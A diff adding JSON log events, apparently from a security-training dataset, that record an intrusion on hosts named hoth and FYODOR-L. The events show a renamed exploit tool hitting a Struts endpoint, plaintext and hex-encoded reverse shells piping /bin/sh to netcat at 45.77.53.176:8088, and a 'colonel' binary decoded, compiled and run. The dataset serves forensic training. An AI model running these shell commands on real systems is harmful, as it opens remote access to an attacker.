+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"mars.i-08e52f8b5a034012d\",\"calendarTime\":\"Mon Aug 20 14:15:19 2018 UTC\",\"unixTime\":1534774519,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"EC2F3B71-548C-909E-81C3-B1994405F807\",\"username\":\"LOGIN\"},\"columns\":{\"atime\":\"1531910021\",\"auid\":\"500\",\"btime\":\"0\",\"cmdline\":\"\\\"python\\\" \\\"/home/ec2-user/tools/s3-upload.py\\\" \\\"--bucket\\\" \\\"frothlywebcode\\\" \\\"--file\\\" \\\"frothly_html_memcaced.tar.gz\\\" \\\"--folder\\\" E28098E28099 \\\"--target\\\" \\\"frothly_html_memcached.tar.gz\\\"\",\"ctime\":\"1531909958\",\"cwd\":\"\",\"egid\":\"500\",\"euid\":\"500\",\"gid\":\"500\",\"mode\":\"0100755\",\"mtime\":\"1527492002\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/usr/bin/python2.7\",\"pid\":\"32511\",\"status\":\"\",\"time\":\"1534774511\",\"uid\":\"500\",\"uptime\":\"155434\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534774519 timestartpos::110 timeendpos::126 date_second::19 date_hour::14 date_minute::15 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\".-\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"-\""
+    }
+  },
+  {
+    "bucket": "db_1534776480_1534769280_306",
+    "row": 521486,
+    "event": {
+      "_time": "1534775214",
+      "source": "source::/home/ec2-user/.bash_history",
+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::bash_history",
+      "_raw": "python /home/ec2-user/tools/s3-upload.py --bucket frothlywebcode --file frothly_web_memcaced.tar.gz --folder \u2018\u2019 --target frothly_html_memcached.tar.gz",
+      "_meta": "_indextime::1534775214 timestamp::none punct::_//-///-._--__--_.._--__--_.."
+    }
+  },
+  {
+    "bucket": "db_1534776480_1534769280_306",
+    "row": 521489,
+    "event": {
+      "_time": "1534775214",
+      "source": "source::/home/ec2-user/.bash_history",
+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::bash_history",
+      "_raw": "python /home/ec2-user/tools/s3-upload.py --bucket frothlywebcode --file frothly_web_memcaced.tar.gz --folder \u2018\u2019 --target frothly_html_memcached.tar.gz",
+      "_meta": "_indextime::1534775214 timestamp::none punct::_//-///-._--__--_.._--__--_.."
+    }
+  },
+  {
+    "bucket": "db_1534776480_1534769280_306",
+    "row": 521491,
+    "event": {
+      "_time": "1534775214",
+      "source": "source::/home/ec2-user/.bash_history",
+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::bash_history",
+      "_raw": "python /home/ec2-user/tools/s3-upload.py --bucket frothlywebcode --file frothly_html_memcaced.tar.gz --folder \u2018\u2019 --target frothly_html_memcached.tar.gz",
+      "_meta": "_indextime::1534775214 timestamp::none punct::_//-///-._--__--_.._--__--_.."
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 70692,
+    "event": {
+      "_time": "1534763464",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::hoth",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"hoth\",\"calendarTime\":\"Mon Aug 20 11:11:04 2018 UTC\",\"unixTime\":1534763464,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"1E194D56-34FC-06B8-0107-41BC8367251B\",\"username\":\"tomcat8\"},\"columns\":{\"atime\":\"1534763456\",\"auid\":\"4294967295\",\"btime\":\"0\",\"cmdline\":\"\\\"base64\\\" \\\"--decode\\\" \\\"/tmp/colonel\\\"\",\"ctime\":\"1533402434\",\"cwd\":\"\",\"egid\":\"117\",\"euid\":\"111\",\"gid\":\"117\",\"mode\":\"0100755\",\"mtime\":\"1488478042\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/usr/bin/base64\",\"pid\":\"7348\",\"status\":\"\",\"time\":\"1534763459\",\"uid\":\"111\",\"uptime\":\"10316\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534763465 timestartpos::90 timeendpos::110 date_second::5 date_hour::11 date_minute::11 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\"\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"---\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 86388,
+    "event": {
+      "_time": "1534763642",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::hoth",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"hoth\",\"calendarTime\":\"Mon Aug 20 11:14:02 2018 UTC\",\"unixTime\":1534763642,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"1E194D56-34FC-06B8-0107-41BC8367251B\",\"username\":\"tomcat8\"},\"columns\":{\"atime\":\"1534705476\",\"auid\":\"4294967295\",\"btime\":\"0\",\"cmdline\":\"\\\"/bin/bash\\\" \\\"-c\\\" 2F62696E2F736820303C2F746D702F6261636B70697065207C206E632034352E37372E35332E313736203830383820313E2F746D702F6261636B70697065\",\"ctime\":\"1533402432\",\"cwd\":\"\",\"egid\":\"117\",\"euid\":\"111\",\"gid\":\"117\",\"mode\":\"0100755\",\"mtime\":\"1494938995\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/bin/bash\",\"pid\":\"8605\",\"status\":\"\",\"time\":\"1534763639\",\"uid\":\"111\",\"uptime\":\"10496\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534763644 timestartpos::90 timeendpos::110 date_second::4 date_hour::11 date_minute::14 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\"\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"---\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 86390,
+    "event": {
+      "_time": "1534763642",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::hoth",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"hoth\",\"calendarTime\":\"Mon Aug 20 11:14:02 2018 UTC\",\"unixTime\":1534763642,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"1E194D56-34FC-06B8-0107-41BC8367251B\",\"username\":\"tomcat8\"},\"columns\":{\"atime\":\"1534763637\",\"auid\":\"4294967295\",\"btime\":\"0\",\"cmdline\":\"\\\"nc\\\" \\\"45.77.53.176\\\" \\\"8088\\\"\",\"ctime\":\"1533402432\",\"cwd\":\"\",\"egid\":\"117\",\"euid\":\"111\",\"gid\":\"117\",\"mode\":\"0100755\",\"mtime\":\"1354585324\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/bin/nc.openbsd\",\"pid\":\"8608\",\"status\":\"\",\"time\":\"1534763639\",\"uid\":\"111\",\"uptime\":\"10496\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534763644 timestartpos::90 timeendpos::110 date_second::4 date_hour::11 date_minute::14 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\"\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"---\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 89992,
+    "event": {
+      "_time": "1534763701",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::hoth",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"hoth\",\"calendarTime\":\"Mon Aug 20 11:15:01 2018 UTC\",\"unixTime\":1534763701,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"1E194D56-34FC-06B8-0107-41BC8367251B\",\"username\":\"tomcat8\"},\"columns\":{\"atime\":\"1534763658\",\"auid\":\"4294967295\",\"btime\":\"0\",\"cmdline\":\"\\\"gcc\\\" \\\"colonel.c\\\" \\\"-o\\\" \\\"colonelnew\\\"\",\"ctime\":\"1533407021\",\"cwd\":\"\",\"egid\":\"117\",\"euid\":\"111\",\"gid\":\"117\",\"mode\":\"0100755\",\"mtime\":\"1531837736\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/usr/bin/gcc-5\",\"pid\":\"8609\",\"status\":\"\",\"time\":\"1534763662\",\"uid\":\"111\",\"uptime\":\"10519\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534763702 timestartpos::90 timeendpos::110 date_second::2 date_hour::11 date_minute::15 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\"\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"---\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 94274,
+    "event": {
+      "_time": "1534763741",
+      "source": "source::process",
+      "host": "host::FYODOR-L",
+      "sourcetype": "sourcetype::WinHostMon",
+      "_raw": "Type=Process\nName=\"iexeplorer.exe\"\nProcessId=3884\nCommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe\"\nStartTime=\"20180820111356.884817+000\"\nHost=\"FYODOR-L\"\nPath=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\"",
+      "_meta": "_indextime::1534763741 punct::\"=\\\\r=\\\".\\\"\\\\r=\\\\r=\\\":\\\\\\\\\\\\\\\\-\\\\.\\\"_://...://._\\\"//_<//_|__...__>/\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 94275,
+    "event": {
+      "_time": "1534763741",
+      "source": "source::process",
+      "host": "host::FYODOR-L",
+      "sourcetype": "sourcetype::WinHostMon",
+      "_raw": "Type=Process\nName=\"iexeplorer.exe\"\nProcessId=5976\nCommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe\"\nStartTime=\"20180820111357.114472+000\"\nHost=\"FYODOR-L\"\nPath=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\"",
+      "_meta": "_indextime::1534763741 punct::\"=\\\\r=\\\".\\\"\\\\r=\\\\r=\\\":\\\\\\\\\\\\\\\\-\\\\.\\\"_://...://._\\\"//_<//_|__...__>/\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 105183,
+    "event": {
+      "_time": "1534763820",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::hoth",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"hoth\",\"calendarTime\":\"Mon Aug 20 11:17:00 2018 UTC\",\"unixTime\":1534763820,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"1E194D56-34FC-06B8-0107-41BC8367251B\",\"username\":\"tomcat8\"},\"columns\":{\"atime\":\"1534763813\",\"auid\":\"4294967295\",\"btime\":\"0\",\"cmdline\":\"\\\"./colonelnew\\\"\",\"ctime\":\"1534763805\",\"cwd\":\"\",\"egid\":\"117\",\"euid\":\"111\",\"gid\":\"117\",\"mode\":\"0100755\",\"mtime\":\"1534763660\",\"owner_gid\":\"117\",\"owner_uid\":\"111\",\"parent\":\"\",\"path\":\"/tmp/colonelnew\",\"pid\":\"9456\",\"status\":\"\",\"time\":\"1534763818\",\"uid\":\"111\",\"uptime\":\"10675\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534763821 timestartpos::90 timeendpos::110 date_second::1 date_hour::11 date_minute::17 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\"\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"---\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 207432,
+    "event": {
+      "_time": "1534764889",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::hoth",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"hoth\",\"calendarTime\":\"Mon Aug 20 11:34:49 2018 UTC\",\"unixTime\":1534764889,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"1E194D56-34FC-06B8-0107-41BC8367251B\",\"username\":\"tomcat8\"},\"columns\":{\"atime\":\"1534705476\",\"auid\":\"4294967295\",\"btime\":\"0\",\"cmdline\":\"\\\"/bin/bash\\\" \\\"-c\\\" 2F62696E2F736820303C2F746D702F6261636B70697065207C206E632034352E37372E35332E313736203830383820313E2F746D702F6261636B70697065\",\"ctime\":\"1533402432\",\"cwd\":\"\",\"egid\":\"117\",\"euid\":\"111\",\"gid\":\"117\",\"mode\":\"0100755\",\"mtime\":\"1494938995\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/bin/bash\",\"pid\":\"17209\",\"status\":\"\",\"time\":\"1534764848\",\"uid\":\"111\",\"uptime\":\"11705\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534764889 timestartpos::90 timeendpos::110 date_second::49 date_hour::11 date_minute::34 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\"\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"---\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 207433,
+    "event": {
+      "_time": "1534764889",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::hoth",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"hoth\",\"calendarTime\":\"Mon Aug 20 11:34:49 2018 UTC\",\"unixTime\":1534764889,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"1E194D56-34FC-06B8-0107-41BC8367251B\",\"username\":\"tomcat8\"},\"columns\":{\"atime\":\"1534764446\",\"auid\":\"4294967295\",\"btime\":\"0\",\"cmdline\":\"\\\"nc\\\" \\\"45.77.53.176\\\" \\\"8088\\\"\",\"ctime\":\"1534764381\",\"cwd\":\"\",\"egid\":\"117\",\"euid\":\"111\",\"gid\":\"117\",\"mode\":\"0100755\",\"mtime\":\"1414237199\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/bin/nc.traditional\",\"pid\":\"17211\",\"status\":\"\",\"time\":\"1534764848\",\"uid\":\"111\",\"uptime\":\"11705\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534764889 timestartpos::90 timeendpos::110 date_second::49 date_hour::11 date_minute::34 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\"\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"---\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 207477,
+    "event": {
+      "_time": "1534764889",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::hoth",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"hoth\",\"calendarTime\":\"Mon Aug 20 11:34:49 2018 UTC\",\"unixTime\":1534764889,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"1E194D56-34FC-06B8-0107-41BC8367251B\",\"username\":\"tomcat8\"},\"columns\":{\"atime\":\"1534763813\",\"auid\":\"4294967295\",\"btime\":\"0\",\"cmdline\":\"\\\"./colonelnew\\\"\",\"ctime\":\"1534763805\",\"cwd\":\"\",\"egid\":\"117\",\"euid\":\"111\",\"gid\":\"117\",\"mode\":\"0100755\",\"mtime\":\"1534763660\",\"owner_gid\":\"117\",\"owner_uid\":\"111\",\"parent\":\"\",\"path\":\"/tmp/colonelnew\",\"pid\":\"17283\",\"status\":\"\",\"time\":\"1534764888\",\"uid\":\"111\",\"uptime\":\"11745\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534764889 timestartpos::90 timeendpos::110 date_second::49 date_hour::11 date_minute::34 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\"\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"---\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 212832,
+    "event": {
+      "_time": "1534764942",
+      "source": "source::process",
+      "host": "host::FYODOR-L",
+      "sourcetype": "sourcetype::WinHostMon",
+      "_raw": "Type=Process\nName=\"iexeplorer.exe\"\nProcessId=3804\nCommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe\"\nStartTime=\"20180820113400.780562+000\"\nHost=\"FYODOR-L\"\nPath=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\"",
+      "_meta": "_indextime::1534764942 punct::\"=\\\\r=\\\".\\\"\\\\r=\\\\r=\\\":\\\\\\\\\\\\\\\\-\\\\.\\\"_://...://._\\\"//_<//_|__...__>/\""
+    }
+  },
+  {
+    "bucket": "db_1534766463_1534762020_305",
+    "row": 212833,
+    "event": {
+      "_time": "1534764942",
+      "source": "source::process",
+      "host": "host::FYODOR-L",
+      "sourcetype": "sourcetype::WinHostMon",
+      "_raw": "Type=Process\nName=\"iexeplorer.exe\"\nProcessId=3388\nCommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe\"\nStartTime=\"20180820113401.021107+000\"\nHost=\"FYODOR-L\"\nPath=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\"",
+      "_meta": "_indextime::1534764942 punct::\"=\\\\r=\\\".\\\"\\\\r=\\\\r=\\\":\\\\\\\\\\\\\\\\-\\\\.\\\"_://...://._\\\"//_<//_|__...__>/\""
+    }
+  },
+  {
+    "bucket": "db_1534758273_1534755600_303",
+    "row": 132562,
+    "event": {
+      "_time": "1534757453",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"mars.i-08e52f8b5a034012d\",\"calendarTime\":\"Mon Aug 20 09:30:53 2018 UTC\",\"unixTime\":1534757453,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"EC2F3B71-548C-909E-81C3-B1994405F807\",\"username\":\"LOGIN\"},\"columns\":{\"atime\":\"1526876184\",\"auid\":\"500\",\"btime\":\"0\",\"cmdline\":\"\\\"/usr/bin/python3.6\\\" \\\"/usr/local/bin/aws_ir\\\" \\\"key-compromise\\\" \\\"--access-key-id\\\" \\\"AKIAJOGCDXJ5NW5PXUPA\\\" \\\"--plugins\\\" \\\"disableaccess_key\\\"\",\"ctime\":\"1534587856\",\"cwd\":\"\",\"egid\":\"500\",\"euid\":\"500\",\"gid\":\"500\",\"mode\":\"0100755\",\"mtime\":\"1526876184\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/usr/bin/python3.6\",\"pid\":\"15974\",\"status\":\"\",\"time\":\"1534757399\",\"uid\":\"500\",\"uptime\":\"170029\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534757454 timestartpos::110 timeendpos::126 date_second::54 date_hour::9 date_minute::30 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\".-\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"-\""
+    }
+  },
+  {
+    "bucket": "db_1534758273_1534755600_303",
+    "row": 146324,
+    "event": {
+      "_time": "1534757639",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"mars.i-08e52f8b5a034012d\",\"calendarTime\":\"Mon Aug 20 09:33:59 2018 UTC\",\"unixTime\":1534757639,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"EC2F3B71-548C-909E-81C3-B1994405F807\",\"username\":\"LOGIN\"},\"columns\":{\"atime\":\"1526876184\",\"auid\":\"500\",\"btime\":\"0\",\"cmdline\":\"\\\"/usr/bin/python3.6\\\" \\\"/usr/local/bin/aws_ir\\\" \\\"key-compromise\\\" \\\"--access-key-id\\\" \\\"AKIAJOGCDXJ5NW5PXUPA\\\" \\\"--plugins\\\" \\\"disableaccess_key\\\"\",\"ctime\":\"1534587856\",\"cwd\":\"\",\"egid\":\"500\",\"euid\":\"500\",\"gid\":\"500\",\"mode\":\"0100755\",\"mtime\":\"1526876184\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/usr/bin/python3.6\",\"pid\":\"16989\",\"status\":\"\",\"time\":\"1534757620\",\"uid\":\"500\",\"uptime\":\"170250\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534757640 timestartpos::110 timeendpos::126 date_second::0 date_hour::9 date_minute::34 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\".-\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"-\""
+    }
+  },
+  {
+    "bucket": "db_1534758273_1534755600_303",
+    "row": 150788,
+    "event": {
+      "_time": "1534757701",
+      "source": "source::/var/log/osquery/osqueryd.results.log",
+      "host": "host::mars.i-08e52f8b5a034012d",
+      "sourcetype": "sourcetype::osquery:results",
+      "_raw": "{\"name\":\"pack_process-monitoring_proc_events\",\"hostIdentifier\":\"mars.i-08e52f8b5a034012d\",\"calendarTime\":\"Mon Aug 20 09:35:01 2018 UTC\",\"unixTime\":1534757701,\"epoch\":0,\"counter\":0,\"decorations\":{\"host_uuid\":\"EC2F3B71-548C-909E-81C3-B1994405F807\",\"username\":\"LOGIN\"},\"columns\":{\"atime\":\"1526876184\",\"auid\":\"500\",\"btime\":\"0\",\"cmdline\":\"\\\"/usr/bin/python3.6\\\" \\\"/usr/local/bin/aws_ir\\\" \\\"key-compromise\\\" \\\"--access-key-id\\\" \\\"AKIAJOGCDXJ5NW5PXUPA\\\" \\\"--plugins\\\" \\\"disableaccess_key\\\"\",\"ctime\":\"1534587856\",\"cwd\":\"\",\"egid\":\"500\",\"euid\":\"500\",\"gid\":\"500\",\"mode\":\"0100755\",\"mtime\":\"1526876184\",\"owner_gid\":\"0\",\"owner_uid\":\"0\",\"parent\":\"\",\"path\":\"/usr/bin/python3.6\",\"pid\":\"17585\",\"status\":\"\",\"time\":\"1534757656\",\"uid\":\"500\",\"uptime\":\"170286\"},\"action\":\"added\"}",
+      "_meta": "_indextime::1534757702 timestartpos::110 timeendpos::126 date_second::2 date_hour::9 date_minute::35 date_year::2018 date_month::august date_mday::20 date_wday::monday date_zone::local punct::\"{\\\"\\\":\\\"-\\\",\\\"\\\":\\\".-\\\",\\\"\\\":\\\"___::__\\\",\\\"\\\":,\\\"\\\":,\\\"\\\":,\\\"\\\":{\\\"\\\":\\\"-\""
+    }
+  }
+]
